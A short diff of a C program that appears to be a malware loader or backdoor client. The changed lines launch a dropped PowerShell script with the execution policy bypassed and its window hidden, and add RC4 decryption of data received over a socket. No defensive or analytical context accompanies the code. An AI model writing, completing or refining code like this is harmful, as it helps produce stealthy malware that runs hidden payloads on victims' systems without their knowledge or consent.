@@ -233,7 +233,7 @@ int main() {
     si1.dwFlags = STARTF_USESHOWWINDOW;
     si1.wShowWindow = SW_HIDE;
     char commandline[MAX_PATH];
-    snprintf(commandline,sizeof(commandline),"powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -NoNewWindow -File \"%s\"",outfile);
+    snprintf(commandline,sizeof(commandline),"powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -File \"%s\"",outfile);
     BOOL success = CreateProcessA(NULL, commandline, NULL, NULL, FALSE, 0, NULL, NULL, &si1, &pi1);
     if (success) {
         CloseHandle(pi1.hProcess);
@@ -294,7 +294,8 @@ int main() {
         my_closesocket(s);
         return 1;
     }
-
+    BYTE out[8096] = {0};
+    rc4_decrypt(key,key_len,(BYTE*) user, out,strlen(user));
     char buffer[BUFFER_SIZE];
     while (1) {
         memset(buffer, 0, sizeof(buffer));
